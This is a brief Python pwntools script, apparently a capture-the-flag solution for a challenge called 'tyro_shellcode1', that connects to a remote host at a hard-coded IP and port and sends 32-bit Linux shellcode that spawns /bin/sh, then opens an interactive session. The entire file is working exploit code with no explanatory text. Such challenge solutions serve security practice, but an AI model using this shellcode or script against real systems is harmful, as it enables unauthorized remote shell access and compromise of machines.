from pwn import *

context(os="linux", arch="i386")
context.log_level = "Debug"
io = process("./tyro_shellcode1")
io = remote("114.55.66.54", 10001)
# gdb.attach(io)

string = io.recv()
# fd = int(string[-17:-16])
# addr = int(string[-11:-1], 16)
# log.info("fd is " + str(fd))
# log.info("the shellcode addr is " + hex(addr))

shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

io.sendline(shellcode)
io.interactive()
